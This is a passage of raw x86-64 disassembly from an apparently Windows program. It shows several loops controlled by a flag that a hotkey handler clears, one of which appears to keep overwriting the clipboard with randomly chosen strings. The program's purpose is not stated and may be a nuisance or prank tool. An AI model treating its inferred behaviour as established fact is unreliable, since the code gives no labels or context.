   140001e40:	48 83 ec 28          	sub    $0x28,%rsp
   140001e44:	81 fa 12 03 00 00    	cmp    $0x312,%edx
   140001e4a:	75 1c                	jne    0x140001e68
   140001e4c:	49 83 f8 01          	cmp    $0x1,%r8
   140001e50:	75 16                	jne    0x140001e68
   140001e52:	33 c9                	xor    %ecx,%ecx
   140001e54:	c6 05 59 c2 00 00 00 	movb   $0x0,0xc259(%rip)        # 0x14000e0b4
   140001e5b:	ff 15 47 75 00 00    	call   *0x7547(%rip)        # 0x1400093a8
   140001e61:	33 c0                	xor    %eax,%eax
   140001e63:	48 83 c4 28          	add    $0x28,%rsp
   140001e67:	c3                   	ret
   140001e68:	48 83 c4 28          	add    $0x28,%rsp
   140001e6c:	48 ff 25 c5 74 00 00 	rex.W jmp *0x74c5(%rip)        # 0x140009338
   140001e73:	cc                   	int3
   140001e74:	cc                   	int3
   140001e75:	cc                   	int3
   140001e76:	cc                   	int3
   140001e77:	cc                   	int3
   140001e78:	cc                   	int3
   140001e79:	cc                   	int3
   140001e7a:	cc                   	int3
   140001e7b:	cc                   	int3
   140001e7c:	cc                   	int3
   140001e7d:	cc                   	int3
   140001e7e:	cc                   	int3
   140001e7f:	cc                   	int3
   140001e80:	48 83 ec 38          	sub    $0x38,%rsp
   140001e84:	80 3d 29 c2 00 00 00 	cmpb   $0x0,0xc229(%rip)        # 0x14000e0b4
   140001e8b:	0f 84 d1 00 00 00    	je     0x140001f62
   140001e91:	48 89 5c 24 30       	mov    %rbx,0x30(%rsp)
   140001e96:	48 bb ff ff ff ff ff 	movabs $0x7fffffffffffffff,%rbx
   140001e9d:	ff ff 7f 
   140001ea0:	48 89 74 24 28       	mov    %rsi,0x28(%rsp)
   140001ea5:	48 be ff a1 2f 4d ff 	movabs $0x7fffffff4d2fa1ff,%rsi
   140001eac:	ff ff 7f 
   140001eaf:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   140001eb4:	bf 00 5e d0 b2       	mov    $0xb2d05e00,%edi
   140001eb9:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140001ec0:	45 33 c9             	xor    %r9d,%r9d
   140001ec3:	48 8d 0d e6 7b 00 00 	lea    0x7be6(%rip),%rcx        # 0x140009ab0
   140001eca:	45 33 c0             	xor    %r8d,%r8d
   140001ecd:	33 d2                	xor    %edx,%edx
   140001ecf:	ff 15 83 75 00 00    	call   *0x7583(%rip)        # 0x140009458
   140001ed5:	48 8d 4c 24 48       	lea    0x48(%rsp),%rcx
   140001eda:	e8 41 f1 ff ff       	call   0x140001020
   140001edf:	48 8b 44 24 48       	mov    0x48(%rsp),%rax
   140001ee4:	48 3b c6             	cmp    %rsi,%rax
   140001ee7:	7d 0b                	jge    0x140001ef4
   140001ee9:	48 8d 0c 38          	lea    (%rax,%rdi,1),%rcx
   140001eed:	48 89 4c 24 40       	mov    %rcx,0x40(%rsp)
   140001ef2:	eb 05                	jmp    0x140001ef9
   140001ef4:	48 89 5c 24 40       	mov    %rbx,0x40(%rsp)
   140001ef9:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   140001efe:	e8 8d 41 00 00       	call   0x140006090
   140001f03:	45 33 c9             	xor    %r9d,%r9d
   140001f06:	48 8d 0d d3 7b 00 00 	lea    0x7bd3(%rip),%rcx        # 0x140009ae0
   140001f0d:	45 33 c0             	xor    %r8d,%r8d
   140001f10:	33 d2                	xor    %edx,%edx
   140001f12:	ff 15 40 75 00 00    	call   *0x7540(%rip)        # 0x140009458
   140001f18:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   140001f1d:	e8 fe f0 ff ff       	call   0x140001020
   140001f22:	48 8b 44 24 50       	mov    0x50(%rsp),%rax
   140001f27:	48 3b c6             	cmp    %rsi,%rax
   140001f2a:	7d 0b                	jge    0x140001f37
   140001f2c:	48 8d 0c 38          	lea    (%rax,%rdi,1),%rcx
   140001f30:	48 89 4c 24 40       	mov    %rcx,0x40(%rsp)
   140001f35:	eb 05                	jmp    0x140001f3c
   140001f37:	48 89 5c 24 40       	mov    %rbx,0x40(%rsp)
   140001f3c:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   140001f41:	e8 4a 41 00 00       	call   0x140006090
   140001f46:	80 3d 67 c1 00 00 00 	cmpb   $0x0,0xc167(%rip)        # 0x14000e0b4
   140001f4d:	0f 85 6d ff ff ff    	jne    0x140001ec0
   140001f53:	48 8b 7c 24 20       	mov    0x20(%rsp),%rdi
   140001f58:	48 8b 74 24 28       	mov    0x28(%rsp),%rsi
   140001f5d:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140001f62:	48 83 c4 38          	add    $0x38,%rsp
   140001f66:	c3                   	ret
   140001f67:	cc                   	int3
   140001f68:	cc                   	int3
   140001f69:	cc                   	int3
   140001f6a:	cc                   	int3
   140001f6b:	cc                   	int3
   140001f6c:	cc                   	int3
   140001f6d:	cc                   	int3
   140001f6e:	cc                   	int3
   140001f6f:	cc                   	int3
   140001f70:	40 53                	rex push %rbx
   140001f72:	56                   	push   %rsi
   140001f73:	57                   	push   %rdi
   140001f74:	48 83 ec 50          	sub    $0x50,%rsp
   140001f78:	33 d2                	xor    %edx,%edx
   140001f7a:	48 8d 0d ef 79 00 00 	lea    0x79ef(%rip),%rcx        # 0x140009970
   140001f81:	ff 15 39 74 00 00    	call   *0x7439(%rip)        # 0x1400093c0
   140001f87:	33 c9                	xor    %ecx,%ecx
   140001f89:	48 8b d8             	mov    %rax,%rbx
   140001f8c:	ff 15 de 73 00 00    	call   *0x73de(%rip)        # 0x140009370
   140001f92:	b9 01 00 00 00       	mov    $0x1,%ecx
   140001f97:	8b f8                	mov    %eax,%edi
   140001f99:	ff 15 d1 73 00 00    	call   *0x73d1(%rip)        # 0x140009370
   140001f9f:	80 3d 0e c1 00 00 00 	cmpb   $0x0,0xc10e(%rip)        # 0x14000e0b4
   140001fa6:	8b f0                	mov    %eax,%esi
   140001fa8:	0f 84 07 01 00 00    	je     0x1400020b5
   140001fae:	48 89 ac 24 80 00 00 	mov    %rbp,0x80(%rsp)
   140001fb5:	00 
   140001fb6:	48 bd ff ff ff ff ff 	movabs $0x7fffffffffffffff,%rbp
   140001fbd:	ff ff 7f 
   140001fc0:	4c 89 74 24 48       	mov    %r14,0x48(%rsp)
   140001fc5:	49 be ff 79 c4 5e fe 	movabs $0x7ffffffe5ec479ff,%r14
   140001fcc:	ff ff 7f 
   140001fcf:	4c 89 7c 24 40       	mov    %r15,0x40(%rsp)
   140001fd4:	49 bf 00 86 3b a1 01 	movabs $0x1a13b8600,%r15
   140001fdb:	00 00 00 
   140001fde:	66 90                	xchg   %ax,%ax
   140001fe0:	ff 15 1a 76 00 00    	call   *0x761a(%rip)        # 0x140009600
   140001fe6:	25 03 00 00 80       	and    $0x80000003,%eax
   140001feb:	7d 07                	jge    0x140001ff4
   140001fed:	ff c8                	dec    %eax
   140001fef:	83 c8 fc             	or     $0xfffffffc,%eax
   140001ff2:	ff c0                	inc    %eax
   140001ff4:	85 c0                	test   %eax,%eax
   140001ff6:	74 4a                	je     0x140002042
   140001ff8:	83 e8 01             	sub    $0x1,%eax
   140001ffb:	74 40                	je     0x14000203d
   140001ffd:	83 e8 01             	sub    $0x1,%eax
   140002000:	74 22                	je     0x140002024
   140002002:	83 f8 01             	cmp    $0x1,%eax
   140002005:	75 61                	jne    0x140002068
   140002007:	c7 44 24 30 04 00 00 	movl   $0x4,0x30(%rsp)
   14000200e:	00 
   14000200f:	44 8d 47 d8          	lea    -0x28(%rdi),%r8d
   140002013:	89 74 24 28          	mov    %esi,0x28(%rsp)
   140002017:	45 33 c9             	xor    %r9d,%r9d
   14000201a:	c7 44 24 20 28 00 00 	movl   $0x28,0x20(%rsp)
   140002021:	00 
   140002022:	eb 39                	jmp    0x14000205d
   140002024:	c7 44 24 30 04 00 00 	movl   $0x4,0x30(%rsp)
   14000202b:	00 
   14000202c:	45 33 c9             	xor    %r9d,%r9d
   14000202f:	89 74 24 28          	mov    %esi,0x28(%rsp)
   140002033:	c7 44 24 20 28 00 00 	movl   $0x28,0x20(%rsp)
   14000203a:	00 
   14000203b:	eb 1d                	jmp    0x14000205a
   14000203d:	45 33 c9             	xor    %r9d,%r9d
   140002040:	eb 04                	jmp    0x140002046
   140002042:	44 8d 4e d8          	lea    -0x28(%rsi),%r9d
   140002046:	c7 44 24 30 04 00 00 	movl   $0x4,0x30(%rsp)
   14000204d:	00 
   14000204e:	c7 44 24 28 28 00 00 	movl   $0x28,0x28(%rsp)
   140002055:	00 
   140002056:	89 7c 24 20          	mov    %edi,0x20(%rsp)
   14000205a:	45 33 c0             	xor    %r8d,%r8d
   14000205d:	33 d2                	xor    %edx,%edx
   14000205f:	48 8b cb             	mov    %rbx,%rcx
   140002062:	ff 15 e8 72 00 00    	call   *0x72e8(%rip)        # 0x140009350
   140002068:	48 8d 4c 24 78       	lea    0x78(%rsp),%rcx
   14000206d:	e8 ae ef ff ff       	call   0x140001020
   140002072:	48 8b 44 24 78       	mov    0x78(%rsp),%rax
   140002077:	49 3b c6             	cmp    %r14,%rax
   14000207a:	7d 0b                	jge    0x140002087
   14000207c:	4a 8d 0c 38          	lea    (%rax,%r15,1),%rcx
   140002080:	48 89 4c 24 70       	mov    %rcx,0x70(%rsp)
   140002085:	eb 05                	jmp    0x14000208c
   140002087:	48 89 6c 24 70       	mov    %rbp,0x70(%rsp)
   14000208c:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   140002091:	e8 fa 3f 00 00       	call   0x140006090
   140002096:	80 3d 17 c0 00 00 00 	cmpb   $0x0,0xc017(%rip)        # 0x14000e0b4
   14000209d:	0f 85 3d ff ff ff    	jne    0x140001fe0
   1400020a3:	4c 8b 7c 24 40       	mov    0x40(%rsp),%r15
   1400020a8:	4c 8b 74 24 48       	mov    0x48(%rsp),%r14
   1400020ad:	48 8b ac 24 80 00 00 	mov    0x80(%rsp),%rbp
   1400020b4:	00 
   1400020b5:	48 83 c4 50          	add    $0x50,%rsp
   1400020b9:	5f                   	pop    %rdi
   1400020ba:	5e                   	pop    %rsi
   1400020bb:	5b                   	pop    %rbx
   1400020bc:	c3                   	ret
   1400020bd:	cc                   	int3
   1400020be:	cc                   	int3
   1400020bf:	cc                   	int3
   1400020c0:	40 53                	rex push %rbx
   1400020c2:	48 81 ec 30 01 00 00 	sub    $0x130,%rsp
   1400020c9:	48 8b 05 70 bf 00 00 	mov    0xbf70(%rip),%rax        # 0x14000e040
   1400020d0:	48 33 c4             	xor    %rsp,%rax
   1400020d3:	48 89 84 24 20 01 00 	mov    %rax,0x120(%rsp)
   1400020da:	00 
   1400020db:	bb dc 00 00 00       	mov    $0xdc,%ebx
   1400020e0:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   1400020e5:	44 8b c3             	mov    %ebx,%r8d
   1400020e8:	33 d2                	xor    %edx,%edx
   1400020ea:	e8 33 5d 00 00       	call   0x140007e22
   1400020ef:	80 3d be bf 00 00 00 	cmpb   $0x0,0xbfbe(%rip)        # 0x14000e0b4
   1400020f6:	66 0f 6f 05 32 80 00 	movdqa 0x8032(%rip),%xmm0        # 0x14000a130
   1400020fd:	00 
   1400020fe:	f3 0f 7f 44 24 30    	movdqu %xmm0,0x30(%rsp)
   140002104:	66 89 9c 24 84 00 00 	mov    %bx,0x84(%rsp)
   14000210b:	00 
   14000210c:	0f 84 bd 00 00 00    	je     0x1400021cf
   140002112:	48 89 b4 24 40 01 00 	mov    %rsi,0x140(%rsp)
   140002119:	00 
   14000211a:	48 bb ff ff ff ff ff 	movabs $0x7fffffffffffffff,%rbx
   140002121:	ff ff 7f 
   140002124:	48 89 bc 24 48 01 00 	mov    %rdi,0x148(%rsp)
   14000212b:	00 
   14000212c:	48 be 00 c8 17 a8 04 	movabs $0x4a817c800,%rsi
   140002133:	00 00 00 
   140002136:	48 bf ff 37 e8 57 fb 	movabs $0x7ffffffb57e837ff,%rdi
   14000213d:	ff ff 7f 
   140002140:	4c 8d 44 24 40       	lea    0x40(%rsp),%r8
   140002145:	ba ff ff ff ff       	mov    $0xffffffff,%edx
   14000214a:	33 c9                	xor    %ecx,%ecx
   14000214c:	ff 15 06 72 00 00    	call   *0x7206(%rip)        # 0x140009358
   140002152:	85 c0                	test   %eax,%eax
   140002154:	74 32                	je     0x140002188
   140002156:	ff 15 a4 74 00 00    	call   *0x74a4(%rip)        # 0x140009600
   14000215c:	25 03 00 00 80       	and    $0x80000003,%eax
   140002161:	7d 07                	jge    0x14000216a
   140002163:	ff c8                	dec    %eax
   140002165:	83 c8 fc             	or     $0xfffffffc,%eax
   140002168:	ff c0                	inc    %eax
   14000216a:	48 63 c8             	movslq %eax,%rcx
   14000216d:	ba 01 00 00 40       	mov    $0x40000001,%edx
   140002172:	8b 44 8c 30          	mov    0x30(%rsp,%rcx,4),%eax
   140002176:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   14000217b:	89 84 24 94 00 00 00 	mov    %eax,0x94(%rsp)
   140002182:	ff 15 f0 71 00 00    	call   *0x71f0(%rip)        # 0x140009378
   140002188:	48 8d 4c 24 28       	lea    0x28(%rsp),%rcx
   14000218d:	e8 8e ee ff ff       	call   0x140001020
   140002192:	48 8b 44 24 28       	mov    0x28(%rsp),%rax
   140002197:	48 3b c7             	cmp    %rdi,%rax
   14000219a:	7d 0b                	jge    0x1400021a7
   14000219c:	48 8d 0c 30          	lea    (%rax,%rsi,1),%rcx
   1400021a0:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
   1400021a5:	eb 05                	jmp    0x1400021ac
   1400021a7:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   1400021ac:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   1400021b1:	e8 da 3e 00 00       	call   0x140006090
   1400021b6:	80 3d f7 be 00 00 00 	cmpb   $0x0,0xbef7(%rip)        # 0x14000e0b4
   1400021bd:	75 81                	jne    0x140002140
   1400021bf:	48 8b bc 24 48 01 00 	mov    0x148(%rsp),%rdi
   1400021c6:	00 
   1400021c7:	48 8b b4 24 40 01 00 	mov    0x140(%rsp),%rsi
   1400021ce:	00 
   1400021cf:	48 8b 8c 24 20 01 00 	mov    0x120(%rsp),%rcx
   1400021d6:	00 
   1400021d7:	48 33 cc             	xor    %rsp,%rcx
   1400021da:	e8 e1 4c 00 00       	call   0x140006ec0
   1400021df:	48 81 c4 30 01 00 00 	add    $0x130,%rsp
   1400021e6:	5b                   	pop    %rbx
   1400021e7:	c3                   	ret
   1400021e8:	cc                   	int3
   1400021e9:	cc                   	int3
   1400021ea:	cc                   	int3
   1400021eb:	cc                   	int3
   1400021ec:	cc                   	int3
   1400021ed:	cc                   	int3
   1400021ee:	cc                   	int3
   1400021ef:	cc                   	int3
   1400021f0:	4c 8b dc             	mov    %rsp,%r11
   1400021f3:	48 83 ec 78          	sub    $0x78,%rsp
   1400021f7:	80 3d b6 be 00 00 00 	cmpb   $0x0,0xbeb6(%rip)        # 0x14000e0b4
   1400021fe:	48 8d 05 0b 79 00 00 	lea    0x790b(%rip),%rax        # 0x140009b10
   140002205:	49 89 43 a8          	mov    %rax,-0x58(%r11)
   140002209:	48 8d 05 18 79 00 00 	lea    0x7918(%rip),%rax        # 0x140009b28
   140002210:	49 89 43 b0          	mov    %rax,-0x50(%r11)
   140002214:	48 8d 05 25 79 00 00 	lea    0x7925(%rip),%rax        # 0x140009b40
   14000221b:	49 89 43 b8          	mov    %rax,-0x48(%r11)
   14000221f:	48 8d 05 22 79 00 00 	lea    0x7922(%rip),%rax        # 0x140009b48
   140002226:	49 89 43 c0          	mov    %rax,-0x40(%r11)
   14000222a:	48 8d 05 2f 79 00 00 	lea    0x792f(%rip),%rax        # 0x140009b60
   140002231:	49 89 43 c8          	mov    %rax,-0x38(%r11)
   140002235:	48 8d 05 34 79 00 00 	lea    0x7934(%rip),%rax        # 0x140009b70
   14000223c:	49 89 43 d0          	mov    %rax,-0x30(%r11)
   140002240:	0f 84 76 01 00 00    	je     0x1400023bc
   140002246:	49 89 6b f8          	mov    %rbp,-0x8(%r11)
   14000224a:	48 bd ff ff ff ff ff 	movabs $0x7fffffffffffffff,%rbp
   140002251:	ff ff 7f 
   140002254:	4d 89 73 e0          	mov    %r14,-0x20(%r11)
   140002258:	49 be ff 0d fa d5 fe 	movabs $0x7ffffffed5fa0dff,%r14
   14000225f:	ff ff 7f 
   140002262:	4d 89 7b d8          	mov    %r15,-0x28(%r11)
   140002266:	49 bf 00 f2 05 2a 01 	movabs $0x12a05f200,%r15
   14000226d:	00 00 00 
   140002270:	49 89 5b 18          	mov    %rbx,0x18(%r11)
   140002274:	49 89 73 f0          	mov    %rsi,-0x10(%r11)
   140002278:	49 89 7b e8          	mov    %rdi,-0x18(%r11)
   14000227c:	0f 1f 40 00          	nopl   0x0(%rax)
   140002280:	33 c9                	xor    %ecx,%ecx
   140002282:	ff 15 f8 70 00 00    	call   *0x70f8(%rip)        # 0x140009380
   140002288:	85 c0                	test   %eax,%eax
   14000228a:	0f 84 c1 00 00 00    	je     0x140002351
   140002290:	ff 15 02 71 00 00    	call   *0x7102(%rip)        # 0x140009398
   140002296:	ff 15 64 73 00 00    	call   *0x7364(%rip)        # 0x140009600
   14000229c:	44 8b c0             	mov    %eax,%r8d
   14000229f:	b8 ab aa aa 2a       	mov    $0x2aaaaaab,%eax
   1400022a4:	41 f7 e8             	imul   %r8d
   1400022a7:	8b ca                	mov    %edx,%ecx
   1400022a9:	c1 e9 1f             	shr    $0x1f,%ecx
   1400022ac:	03 d1                	add    %ecx,%edx
   1400022ae:	8d 0c 52             	lea    (%rdx,%rdx,2),%ecx
   1400022b1:	03 c9                	add    %ecx,%ecx
   1400022b3:	44 2b c1             	sub    %ecx,%r8d
   1400022b6:	49 63 c0             	movslq %r8d,%rax
   1400022b9:	48 8b 4c c4 20       	mov    0x20(%rsp,%rax,8),%rcx
   1400022be:	48 c7 c0 ff ff ff ff 	mov    $0xffffffffffffffff,%rax
   1400022c5:	66 66 66 0f 1f 84 00 	data16 data16 nopw 0x0(%rax,%rax,1)
   1400022cc:	00 00 00 00 
   1400022d0:	66 83 7c 41 02 00    	cmpw   $0x0,0x2(%rcx,%rax,2)
   1400022d6:	48 8d 40 01          	lea    0x1(%rax),%rax
   1400022da:	75 f4                	jne    0x1400022d0
   1400022dc:	48 8d 3c 45 02 00 00 	lea    0x2(,%rax,2),%rdi
   1400022e3:	00 
   1400022e4:	b9 02 00 00 00       	mov    $0x2,%ecx
   1400022e9:	48 8b d7             	mov    %rdi,%rdx
   1400022ec:	ff 15 26 6e 00 00    	call   *0x6e26(%rip)        # 0x140009118
   1400022f2:	48 8b f0             	mov    %rax,%rsi
   1400022f5:	ff 15 05 73 00 00    	call   *0x7305(%rip)        # 0x140009600
   1400022fb:	44 8b c8             	mov    %eax,%r9d
   1400022fe:	b8 ab aa aa 2a       	mov    $0x2aaaaaab,%eax
   140002303:	41 f7 e9             	imul   %r9d
   140002306:	8b ca                	mov    %edx,%ecx
   140002308:	c1 e9 1f             	shr    $0x1f,%ecx
   14000230b:	03 d1                	add    %ecx,%edx
   14000230d:	8d 0c 52             	lea    (%rdx,%rdx,2),%ecx
   140002310:	03 c9                	add    %ecx,%ecx
   140002312:	44 2b c9             	sub    %ecx,%r9d
   140002315:	48 8b ce             	mov    %rsi,%rcx
   140002318:	49 63 c1             	movslq %r9d,%rax
   14000231b:	48 8b 5c c4 20       	mov    0x20(%rsp,%rax,8),%rbx
   140002320:	ff 15 1a 6e 00 00    	call   *0x6e1a(%rip)        # 0x140009140
   140002326:	4c 8b c7             	mov    %rdi,%r8
   140002329:	48 8b d3             	mov    %rbx,%rdx
   14000232c:	48 8b c8             	mov    %rax,%rcx
   14000232f:	e8 17 5c 00 00       	call   0x140007f4b
   140002334:	48 8b ce             	mov    %rsi,%rcx
   140002337:	ff 15 43 6d 00 00    	call   *0x6d43(%rip)        # 0x140009080
   14000233d:	48 8b d6             	mov    %rsi,%rdx
   140002340:	b9 0d 00 00 00       	mov    $0xd,%ecx
   140002345:	ff 15 6d 70 00 00    	call   *0x706d(%rip)        # 0x1400093b8
   14000234b:	ff 15 3f 70 00 00    	call   *0x703f(%rip)        # 0x140009390
   140002351:	48 8d 8c 24 88 00 00 	lea    0x88(%rsp),%rcx
   140002358:	00 
   140002359:	e8 c2 ec ff ff       	call   0x140001020
   14000235e:	48 8b 84 24 88 00 00 	mov    0x88(%rsp),%rax
   140002365:	00 
   140002366:	49 3b c6             	cmp    %r14,%rax
   140002369:	7d 0e                	jge    0x140002379
   14000236b:	4a 8d 0c 38          	lea    (%rax,%r15,1),%rcx
   14000236f:	48 89 8c 24 80 00 00 	mov    %rcx,0x80(%rsp)
   140002376:	00 
   140002377:	eb 08                	jmp    0x140002381
   140002379:	48 89 ac 24 80 00 00 	mov    %rbp,0x80(%rsp)
   140002380:	00 
   140002381:	48 8d 8c 24 80 00 00 	lea    0x80(%rsp),%rcx
   140002388:	00 
   140002389:	e8 02 3d 00 00       	call   0x140006090
   14000238e:	80 3d 1f bd 00 00 00 	cmpb   $0x0,0xbd1f(%rip)        # 0x14000e0b4
   140002395:	0f 85 e5 fe ff ff    	jne    0x140002280
   14000239b:	4c 8b 7c 24 50       	mov    0x50(%rsp),%r15
   1400023a0:	4c 8b 74 24 58       	mov    0x58(%rsp),%r14
   1400023a5:	48 8b 7c 24 60       	mov    0x60(%rsp),%rdi
   1400023aa:	48 8b 74 24 68       	mov    0x68(%rsp),%rsi
   1400023af:	48 8b 6c 24 70       	mov    0x70(%rsp),%rbp
   1400023b4:	48 8b 9c 24 90 00 00 	mov    0x90(%rsp),%rbx
   1400023bb:	00 
   1400023bc:	48 83 c4 78          	add    $0x78,%rsp
   1400023c0:	c3                   	ret
   1400023c1:	cc                   	int3
   1400023c2:	cc                   	int3
   1400023c3:	cc                   	int3
   1400023c4:	cc                   	int3
   1400023c5:	cc                   	int3
   1400023c6:	cc                   	int3
   1400023c7:	cc                   	int3
   1400023c8:	cc                   	int3
   1400023c9:	cc                   	int3
   1400023ca:	cc                   	int3
   1400023cb:	cc                   	int3
   1400023cc:	cc                   	int3
   1400023cd:	cc                   	int3
   1400023ce:	cc                   	int3
   1400023cf:	cc                   	int3
   1400023d0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400023d5:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   1400023da:	48 89 7c 24 18       	mov    %rdi,0x18(%rsp)
   1400023df:	4c 89 74 24 20       	mov    %r14,0x20(%rsp)
   1400023e4:	55                   	push   %rbp
   1400023e5:	48 8d ac 24 30 ff ff 	lea    -0xd0(%rsp),%rbp
   1400023ec:	ff 
   1400023ed:	48 81 ec d0 01 00 00 	sub    $0x1d0,%rsp
   1400023f4:	48 8b 05 45 bc 00 00 	mov    0xbc45(%rip),%rax        # 0x14000e040
   1400023fb:	48 33 c4             	xor    %rsp,%rax
   1400023fe:	48 89 85 c0 00 00 00 	mov    %rax,0xc0(%rbp)
   140002405:	33 d2                	xor    %edx,%edx
   140002407:	33 c9                	xor    %ecx,%ecx
   140002409:	ff 15 21 72 00 00    	call   *0x7221(%rip)        # 0x140009630
   14000240f:	85 c0                	test   %eax,%eax
   140002411:	0f 88 0e 03 00 00    	js     0x140002725
   140002417:	45 33 f6             	xor    %r14d,%r14d
   14000241a:	4c 89 74 24 40       	mov    %r14,0x40(%rsp)
   14000241f:	44 89 74 24 38       	mov    %r14d,0x38(%rsp)
   140002424:	4c 89 74 24 30       	mov    %r14,0x30(%rsp)
   140002429:	c7 44 24 28 03 00 00 	movl   $0x3,0x28(%rsp)
   140002430:	00 
   140002431:	c7 44 24 20 06 00 00 	movl   $0x6,0x20(%rsp)
   140002438:	00 
   140002439:	45 33 c9             	xor    %r9d,%r9d
   14000243c:	45 33 c0             	xor    %r8d,%r8d
   14000243f:	bf ff ff ff ff       	mov    $0xffffffff,%edi
   140002444:	8b d7                	mov    %edi,%edx
   140002446:	33 c9                	xor    %ecx,%ecx
   140002448:	ff 15 da 71 00 00    	call   *0x71da(%rip)        # 0x140009628
   14000244e:	8b d8                	mov    %eax,%ebx
   140002450:	85 c0                	test   %eax,%eax
   140002452:	0f 88 c5 02 00 00    	js     0x14000271d
   140002458:	4c 89 75 68          	mov    %r14,0x68(%rbp)
   14000245c:	48 8d 45 68          	lea    0x68(%rbp),%rax
   140002460:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140002465:	4c 8d 0d 8c 72 00 00 	lea    0x728c(%rip),%r9        # 0x1400096f8
   14000246c:	33 d2                	xor    %edx,%edx
   14000246e:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   140002474:	48 8d 0d 8d 72 00 00 	lea    0x728d(%rip),%rcx        # 0x140009708
   14000247b:	ff 15 9f 71 00 00    	call   *0x719f(%rip)        # 0x140009620
   140002481:	8b d8                	mov    %eax,%ebx
   140002483:	85 c0                	test   %eax,%eax
   140002485:	0f 88 92 02 00 00    	js     0x14000271d
   14000248b:	48 8d 4d a8          	lea    -0x58(%rbp),%rcx
   14000248f:	ff 15 23 6e 00 00    	call   *0x6e23(%rip)        # 0x1400092b8
   140002495:	90                   	nop
   140002496:	0f 10 45 a8          	movups -0x58(%rbp),%xmm0
   14000249a:	0f 11 44 24 70       	movups %xmm0,0x70(%rsp)
   14000249f:	f2 0f 10 45 b8       	movsd  -0x48(%rbp),%xmm0
   1400024a4:	f2 0f 11 44 24 58    	movsd  %xmm0,0x58(%rsp)
   1400024aa:	48 8d 4d 90          	lea    -0x70(%rbp),%rcx
   1400024ae:	ff 15 04 6e 00 00    	call   *0x6e04(%rip)        # 0x1400092b8
   1400024b4:	90                   	nop
   1400024b5:	0f 10 45 90          	movups -0x70(%rbp),%xmm0
   1400024b9:	0f 11 45 c0          	movups %xmm0,-0x40(%rbp)
   1400024bd:	f2 0f 10 45 a0       	movsd  -0x60(%rbp),%xmm0
   1400024c2:	f2 0f 11 44 24 60    	movsd  %xmm0,0x60(%rsp)
   1400024c8:	48 8d 4d 20          	lea    0x20(%rbp),%rcx
   1400024cc:	ff 15 e6 6d 00 00    	call   *0x6de6(%rip)        # 0x1400092b8
   1400024d2:	90                   	nop
   1400024d3:	0f 10 45 20          	movups 0x20(%rbp),%xmm0
   1400024d7:	0f 11 45 e0          	movups %xmm0,-0x20(%rbp)
   1400024db:	f2 0f 10 45 30       	movsd  0x30(%rbp),%xmm0
   1400024e0:	f2 0f 11 44 24 50    	movsd  %xmm0,0x50(%rsp)
   1400024e6:	48 8d 4d 00          	lea    0x0(%rbp),%rcx
   1400024ea:	ff 15 c8 6d 00 00    	call   *0x6dc8(%rip)        # 0x1400092b8
   1400024f0:	90                   	nop
   1400024f1:	0f 10 44 24 70       	movups 0x70(%rsp),%xmm0
   1400024f6:	0f 29 44 24 70       	movaps %xmm0,0x70(%rsp)
   1400024fb:	f2 0f 10 44 24 58    	movsd  0x58(%rsp),%xmm0
   140002501:	f2 0f 11 45 80       	movsd  %xmm0,-0x80(%rbp)
   140002506:	0f 10 45 c0          	movups -0x40(%rbp),%xmm0
   14000250a:	0f 29 45 c0          	movaps %xmm0,-0x40(%rbp)
   14000250e:	f2 0f 10 44 24 60    	movsd  0x60(%rsp),%xmm0
   140002514:	f2 0f 11 45 d0       	movsd  %xmm0,-0x30(%rbp)
   140002519:	0f 10 45 e0          	movups -0x20(%rbp),%xmm0
   14000251d:	0f 29 45 e0          	movaps %xmm0,-0x20(%rbp)
   140002521:	f2 0f 10 44 24 50    	movsd  0x50(%rsp),%xmm0
   140002527:	f2 0f 11 45 f0       	movsd  %xmm0,-0x10(%rbp)
   14000252c:	0f 10 45 00          	movups 0x0(%rbp),%xmm0
   140002530:	0f 29 45 40          	movaps %xmm0,0x40(%rbp)
   140002534:	f2 0f 10 4d 10       	movsd  0x10(%rbp),%xmm1
   140002539:	f2 0f 11 4d 50       	movsd  %xmm1,0x50(%rbp)
   14000253e:	48 8b 4d 68          	mov    0x68(%rbp),%rcx
   140002542:	48 8b 01             	mov    (%rcx),%rax
   140002545:	48 8d 54 24 70       	lea    0x70(%rsp),%rdx
   14000254a:	48 89 54 24 20       	mov    %rdx,0x20(%rsp)
   14000254f:	4c 8d 4d c0          	lea    -0x40(%rbp),%r9
   140002553:	4c 8d 45 e0          	lea    -0x20(%rbp),%r8
   140002557:	48 8d 55 40          	lea    0x40(%rbp),%rdx
   14000255b:	ff 50 50             	call   *0x50(%rax)
   14000255e:	8b d8                	mov    %eax,%ebx
   140002560:	48 8d 4d 00          	lea    0x0(%rbp),%rcx
   140002564:	ff 15 3e 6d 00 00    	call   *0x6d3e(%rip)        # 0x1400092a8
   14000256a:	90                   	nop
   14000256b:	48 8d 4d 20          	lea    0x20(%rbp),%rcx
   14000256f:	ff 15 33 6d 00 00    	call   *0x6d33(%rip)        # 0x1400092a8
   140002575:	90                   	nop
   140002576:	48 8d 4d 90          	lea    -0x70(%rbp),%rcx
   14000257a:	ff 15 28 6d 00 00    	call   *0x6d28(%rip)        # 0x1400092a8
   140002580:	90                   	nop
   140002581:	48 8d 4d a8          	lea    -0x58(%rbp),%rcx
   140002585:	ff 15 1d 6d 00 00    	call   *0x6d1d(%rip)        # 0x1400092a8
   14000258b:	85 db                	test   %ebx,%ebx
   14000258d:	0f 88 6b 03 00 00    	js     0x1400028fe
   140002593:	4c 89 75 70          	mov    %r14,0x70(%rbp)
   140002597:	b9 18 00 00 00       	mov    $0x18,%ecx
   14000259c:	e8 47 49 00 00       	call   0x140006ee8
   1400025a1:	48 8b d8             	mov    %rax,%rbx
   1400025a4:	48 89 44 24 50       	mov    %rax,0x50(%rsp)
   1400025a9:	48 85 c0             	test   %rax,%rax
